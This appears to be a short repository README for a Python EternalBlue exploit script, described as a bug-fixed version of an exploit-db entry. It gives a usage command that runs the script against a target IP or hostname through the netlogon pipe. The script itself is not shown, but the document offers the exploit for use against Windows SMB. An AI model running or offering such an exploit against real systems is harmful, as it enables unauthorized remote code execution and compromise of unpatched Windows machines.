# Eternalblue exploit, python script

A bug fixed version of https://www.exploit-db.com/exploits/42315/.


## Usage example
```python
python EternalBlueWindows7AndLater <IP/hostname> netlogon
````
